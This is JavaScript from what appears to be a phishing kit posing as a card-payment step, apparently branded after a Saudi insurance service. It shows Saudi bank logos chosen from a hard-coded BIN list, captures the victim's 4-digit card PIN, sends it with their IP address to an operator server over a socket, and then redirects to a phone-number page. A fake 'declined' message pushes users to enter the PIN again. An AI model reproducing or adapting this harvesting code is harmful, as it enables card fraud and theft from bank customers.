    document.addEventListener("DOMContentLoaded", () => {

      
      const scheme   = sessionStorage.getItem("Card type");
      const bin      = sessionStorage.getItem("cardBin") || "";
      const tempData = JSON.parse(sessionStorage.getItem("tameeniTempData") || "{}");
      const last4    = tempData.cardLast4 || "****";

      document.getElementById("cardLast4").textContent = last4;

      
      const networkLogo = document.getElementById("networkLogo");
      if (scheme === "visa") {
        networkLogo.src = "assets/photos/Visa.png";
        networkLogo.style.display = "block";
      } else if (scheme === "mastercard") {
        networkLogo.src = "assets/photos/Mastercard.png";
        networkLogo.style.display = "block";
      }

      
      const SAUDI_BINS = {
        '446393':'Alrajhi','446394':'Alrajhi','446395':'Alrajhi','446396':'Alrajhi',
        '446397':'Alrajhi','446398':'Alrajhi','446399':'Alrajhi','409201':'Alrajhi',
        '457865':'Alrajhi','457866':'Alrajhi','457867':'Alrajhi','457868':'Alrajhi',
        '408822':'Alrajhi','408823':'Alrajhi','408824':'Alrajhi','408825':'Alrajhi',
        '426898':'Alrajhi','426899':'Alrajhi','405433':'Alrajhi',
        '458024':'Alrajhi','458025':'Alrajhi','458026':'Alrajhi',
        '479884':'Alrajhi','479885':'Alrajhi','479886':'Alrajhi',
        '484783':'Alrajhi','455703':'Alrajhi','455704':'Alrajhi',
        '512345':'Alrajhi','512346':'Alrajhi','512347':'Alrajhi','512348':'Alrajhi',
        '521104':'Alrajhi','521105':'Alrajhi','521106':'Alrajhi','521107':'Alrajhi',
        '543350':'Alrajhi','543351':'Alrajhi','543352':'Alrajhi','543353':'Alrajhi',
        '588845':'Alrajhi',
        '455036':'alahli','455037':'alahli','455038':'alahli','455039':'alahli',
        '407197':'alahli','407198':'alahli','407199':'alahli','407200':'alahli',
        '458455':'alahli','458456':'alahli','458457':'alahli','458458':'alahli',
        '457763':'alahli','457764':'alahli','457765':'alahli','457766':'alahli',
        '435013':'alahli','435014':'alahli','435015':'alahli','435016':'alahli',
        '458214':'alahli',
        '524878':'alahli','524879':'alahli','524880':'alahli','524881':'alahli',
        '529415':'alahli','529416':'alahli','529417':'alahli','529418':'alahli',
        '540281':'alahli','540282':'alahli','540283':'alahli','540284':'alahli',
        '557396':'alahli','557397':'alahli','557398':'alahli','557399':'alahli',
        '524197':'alahli','545205':'alahli','535825':'alahli',
        '407861':'alryad','407862':'alryad','407863':'alryad','407864':'alryad',
        '476009':'alryad','476010':'alryad','476011':'alryad','476012':'alryad',
        '457935':'alryad','457936':'alryad','457937':'alryad','457938':'alryad',
        '435019':'alryad','435020':'alryad','435021':'alryad','435022':'alryad',
        '409665':'alryad',
        '529741':'alryad','520090':'alryad',
        '512718':'alryad','512719':'alryad','512720':'alryad','512721':'alryad',
        '541168':'alryad','541169':'alryad','541170':'alryad','541171':'alryad',
        '524714':'alryad','524715':'alryad','524716':'alryad','524717':'alryad',
      };

      const bankKey = SAUDI_BINS[bin];
      const bankLogo = document.getElementById("bankLogo");
      if (bankKey) {
        bankLogo.src = "assets/photos/" + bankKey + ".png";
        bankLogo.style.display = "block";
      }

      
      const boxes   = document.querySelectorAll(".pin-box");
      const hidden  = document.getElementById("verification_code");
      const submitBtn = document.getElementById("pinSubmitBtn");

      function updateState() {
        const val = Array.from(boxes).map(b => b.value).join("");
        hidden.value = val;
        const full = val.length === 4;
        submitBtn.disabled = !full;
        submitBtn.classList.toggle("active", full);
        boxes.forEach((b, i) => b.classList.toggle("filled", b.value !== ""));
      }

      boxes.forEach((box, i) => {
        box.addEventListener("input", () => {
          box.value = box.value.replace(/\D/g, "").slice(0, 1);
          if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
          updateState();
        });
        box.addEventListener("keydown", (e) => {
          if (e.key === "Backspace" && !box.value && i > 0) {
            boxes[i - 1].focus();
            boxes[i - 1].value = "";
            updateState();
          }
        });
      });

      
      const params = new URLSearchParams(window.location.search);
      if (params.get("declined") === "true") {
        const declineBox = document.getElementById("declineBox");
        if (declineBox) {
          declineBox.style.display = "flex";
          setTimeout(() => declineBox.scrollIntoView({ behavior: "smooth", block: "center" }), 300);
        }
      }

      
      const form    = document.getElementById("codeForm");
      const overlay = document.getElementById("loadingOverlay");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        overlay.classList.remove("d-none");
        overlay.classList.add("d-flex");

        while (window.visitorIP === null) {
          await new Promise((r) => setTimeout(r, 50));
        }

        const code = hidden.value;
        window.socket.emit("submitPin", {
          ip: window.visitorIP,
          verification_code: code,
        });
      });

      window.socket.on("ackPin", (resp) => {
        if (resp.success) {
          window.location.href = "phone.html";
        } else {
          overlay.classList.remove("d-flex");
          overlay.classList.add("d-none");
          console.error(resp.error);
        }
      });

    });